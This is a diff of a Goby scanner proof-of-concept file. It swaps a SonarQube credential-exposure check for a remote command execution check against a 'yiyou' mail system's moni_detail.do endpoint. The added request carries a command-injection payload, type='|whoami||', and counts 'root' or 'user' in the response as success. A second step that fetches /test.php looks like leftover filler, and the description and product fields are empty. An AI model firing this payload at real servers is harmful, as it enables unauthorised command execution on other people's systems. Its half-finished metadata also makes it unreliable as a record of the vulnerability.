@@ -1,18 +1,18 @@
 {
-      "Name": "SonarQube unauth CVE-2020-27986",
+      "Name": "yiyou  moni_detail.do Remote command execution",
       "Level": "3",
       "Tags": [
-            "unauth"
+            "rce"
       ],
-      "GobyQuery": "app=\"SonarQube-code management\"",
-      "Description": "SonarQube 8.4.2.36762 allows remote attackers to discover cleartext SMTP, SVN, and GitLab credentials via the api/settings/values URI.",
-      "Product": "SonarQube",
-      "Homepage": "https://www.sonarqube.org/",
-      "Author": "aetkrad",
+      "GobyQuery": "title=\"邮件\"",
+      "Description": "",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
       "Impact": "",
       "Recommendation": "",
       "References": [
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27986"
+            "https://gobies.org/"
       ],
       "HasExp": true,
       "ExpParams": null,
@@ -24,12 +24,12 @@
             "AND",
             {
                   "Request": {
-                        "method": "GET",
-                        "uri": "/api/settings/values",
-                        "follow_redirect": false,
+                        "method": "POST",
+                        "uri": "/webadm/?q=moni_detail.do&action=gragh",
+                        "follow_redirect": true,
                         "header": null,
                         "data_type": "text",
-                        "data": "",
+                        "data": "type='|whoami||'",
                         "set_variable": []
                   },
                   "ResponseTest": {
@@ -47,14 +47,14 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "sonaranalyzer-cs.nuget.packageVersion",
+                                    "value": "user",
                                     "bz": ""
                               },
                               {
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "sonar.core.id",
+                                    "value": "root",
                                     "bz": ""
                               }
                         ]
@@ -69,7 +69,7 @@
             {
                   "Request": {
                         "method": "GET",
-                        "uri": "/api/settings/values",
+                        "uri": "/test.php",
                         "follow_redirect": true,
                         "header": null,
                         "data_type": "text",
@@ -91,14 +91,7 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "sonaranalyzer-cs.nuget.packageVersion",
-                                    "bz": ""
-                              },
-                              {
-                                    "type": "item",
-                                    "variable": "$body",
-                                    "operation": "contains",
-                                    "value": "sonar.core.id",
+                                    "value": "test",
                                     "bz": ""
                               }
                         ]
@@ -108,6 +101,6 @@
                   ]
             }
       ],
-      "PostTime": "2022-06-25 20:10:24",
+      "PostTime": "2022-06-25 19:16:26",
       "GobyVersion": "1.9.323"
 }
